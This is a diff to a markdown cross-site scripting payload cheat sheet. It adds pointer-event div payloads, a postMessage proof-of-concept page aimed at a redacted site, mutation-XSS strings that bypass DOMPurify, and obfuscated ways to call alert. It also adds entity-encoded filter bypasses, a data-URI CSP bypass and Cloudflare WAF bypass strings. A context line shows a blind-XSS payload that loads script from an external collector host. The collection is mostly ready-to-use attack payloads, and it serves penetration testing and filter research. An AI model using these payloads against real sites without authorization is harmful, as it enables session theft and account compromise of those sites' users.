@@ -13,10 +13,12 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
 - [XSS in HTML/Applications](#xss-in-htmlapplications)
 - [XSS in wrappers javascript and data URI](#xss-in-wrappers-javascript-and-data-uri)
 - [XSS in files (XML/SVG/CSS/Flash/Markdown)](#xss-in-files)
+- [XSS in PostMessage](#xss-in-postmessage)
 - [Blind XSS](#blind-xss)
   - [XSS Hunter](#xss-hunter)
   - [Other Blind XSS tools](#other-blind-xss-tools)
   - [Blind XSS endpoint](#blind-xss-endpoint)
+- [Mutated XSS](#mutated-xss)
 - [Polyglot XSS](#polyglot-xss)
 - [Filter Bypass and Exotic payloads](#filter-bypass-and-exotic-payloads)
   - [Bypass case sensitive](#bypass-case-sensitive)
@@ -141,6 +143,15 @@ Svg payload
 <svg id=alert(1) onload=eval(id)>
 "><svg/onload=alert(String.fromCharCode(88,83,83))>
 "><svg/onload=alert(/XSS/)
+
+Div payload
+<div onpointerover="alert(45)">MOVE HERE</div>
+<div onpointerdown="alert(45)">MOVE HERE</div>
+<div onpointerenter="alert(45)">MOVE HERE</div>
+<div onpointerleave="alert(45)">MOVE HERE</div>
+<div onpointermove="alert(45)">MOVE HERE</div>
+<div onpointerout="alert(45)">MOVE HERE</div>
+<div onpointerup="alert(45)">MOVE HERE</div>
 ```
 
 XSS for HTML5
@@ -253,7 +264,7 @@ vbscript:msgbox("XSS")
 </name>
 ```
 
-XSS in XML
+### XSS in XML
 
 ```xml
 <html>
@@ -264,7 +275,7 @@ XSS in XML
 </html>
 ```
 
-XSS in SVG
+### XSS in SVG
 
 ```xml
 <?xml version="1.0" standalone="no"?>
@@ -278,7 +289,7 @@ XSS in SVG
 </svg>
 ```
 
-XSS in SVG (short)
+### XSS in SVG (short)
 
 ```javascript
 <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
@@ -288,7 +299,7 @@ XSS in SVG (short)
 <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
 ```
 
-XSS in Markdown
+### XSS in Markdown
 
 ```csharp
 [a](javascript:prompt(document.cookie))
@@ -297,7 +308,7 @@ XSS in Markdown
 [a](javascript:window.onerror=alert;throw%201)
 ```
 
-XSS in SWF flash application
+### XSS in SWF flash application
 
 ```powershell
 Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
@@ -307,7 +318,7 @@ IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvali
 
 more payloads in ./files
 
-XSS in SWF flash application
+### XSS in SWF flash application
 
 ```
 flashmediaelement.swf?jsinitfunctio%gn=alert`1`
@@ -328,7 +339,7 @@ flashcanvas.swf?id=test\"));}catch(e){alert(document.domain)}//
 phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domain)}//
 ```
 
-XSS in CSS
+### XSS in CSS
 
 ```html
 <!DOCTYPE html>
@@ -344,6 +355,33 @@ div  {
   <body>
     <div>lol</div>
   </body>
+</html>
+```
+
+## XSS in PostMessage
+
+> If the target origin is asterisk * the message can be sent to any domain has reference to the child page.
+
+```html
+<html>
+<body>
+    <input type=button value="Click Me" id="btn">
+</body>
+
+<script>
+document.getElementById('btn').onclick = function(e){
+    window.poc = window.open('http://www.redacted.com/#login');
+    setTimeout(function(){
+        window.poc.postMessage(
+            {
+                "sender": "accounts",
+                "url": "javascript:confirm('XSS')",
+            },
+            '*'
+        );
+    }, 2000);
+}
+</script>
 </html>
 ```
 
@@ -379,6 +417,21 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursu
 - Referer Header
   - Custom Site Analytics
   - Administrative Panel logs
+- User Agent
+  - Custom Site Analytics
+  - Administrative Panel logs
+- Comment Box
+  - Administrative Panel
+
+## Mutated XSS
+
+Use browsers quirks to recreate some HTML tags when it is inside an `element.innerHTML`.
+
+Mutated XSS from Masato Kinugawa, used against DOMPurify component on Google Search. Technical blogposts available at https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/ and https://research.securitum.com/dompurify-bypass-using-mxss/.
+
+```javascript
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+```
 
 ## Polyglot XSS
 
@@ -520,6 +573,9 @@ You can bypass a single quote with &#39; in an on mousedown event handler
 <script>window['alert'](document['domain'])</script>
 ```
 
+Convert IP address into decimal format: IE. `http://192.168.1.1` == `http://3232235777`
+http://www.geektools.com/cgi-bin/ipconv.cgi
+
 ### Bypass parenthesis for string
 
 ```javascript
@@ -623,6 +679,38 @@ content['alert'](6)
 [12].forEach(alert);
 ```
 
+From [@theMiddle](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/) - Using global variables
+
+The Object.keys() method returns an array of a given object's own property names, in the same order as we get with a normal loop. That's means that we can access any JavaScript function by using its **index number instead the function name**.
+
+```javascript
+c=0; for(i in self) { if(i == "alert") { console.log(c); } c++; }
+// 5
+```
+
+Then calling alert is :
+
+```javascript
+Object.keys(self)[5]
+// "alert"
+self[Object.keys(self)[5]]("1") // alert("1")
+```
+
+We can find "alert" with a regular expression like ^a[rel]+t$ : 
+
+```javascript
+a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} //bind function alert on new function a()
+
+// then you can use a() with Object.keys
+
+self[Object.keys(self)[a()]]("1") // alert("1")
+```
+
+Oneliner: 
+```javascript
+a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]]("1")
+```
+
 From [@quanyang](https://twitter.com/quanyang/status/1078536601184030721) tweet.
 
 ```javascript
@@ -711,6 +799,8 @@ You don't need to close your tags.
 
 ```javascript
 %26%2397;lert(1)
+&#97;&#108;&#101;&#114;&#116;
+></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
 ```
 
 ### Bypass using Katana
@@ -874,7 +964,24 @@ Works for CSP like `script-src self`
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
 ```
 
+### Bypass CSP by [@404death](https://twitter.com/404death/status/1191222237782659072)
+
+Works for CSP like `script-src 'self' data:`
+
+```javascript
+<script ?/src="data:+,\u0061lert%281%29">/</script>
+```
+
+
 ## Common WAF Bypass
+
+### Cloudflare XSS Bypasses by [@Bohdan Korzhynskyi](https://twitter.com/h1_ragnar) - 3rd june 2019
+
+```html
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+```
 
 ### Cloudflare XSS Bypass - 22nd march 2019 (by @RakeshMane10)
 
@@ -985,6 +1092,7 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 - [How I found a $5,000 Google Maps XSS (by fiddling with Protobuf)](https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff#.cktt61q9g) by Marin MoulinierFollow
 - [Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities](https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/) by Brett 
 - [XSSI, Client Side Brute Force](http://blog.intothesymmetry.com/2017/05/cross-origin-brute-forcing-of-saml-and.html)  
+- [postMessage XSS on a million sites - December 15, 2016 - Mathias Karlsson](https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/)
 - [postMessage XSS Bypass](https://hackerone.com/reports/231053)
 - [XSS in Uber via Cookie](http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/) by zhchbin
 - [Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP](https://hackerone.com/reports/207042) by frans
@@ -998,3 +1106,5 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 - [XSS in www.yahoo.com](https://www.youtube.com/watch?v=d9UEVv3cJ0Q&feature=youtu.be) 
 - [Stored XSS, and SSRF in Google using the Dataset Publishing Language](https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html)
 - [Stored XSS on Snapchat](https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd)
+- [XSS cheat sheet - PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+- [mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang](https://cure53.de/fp170.pdf)
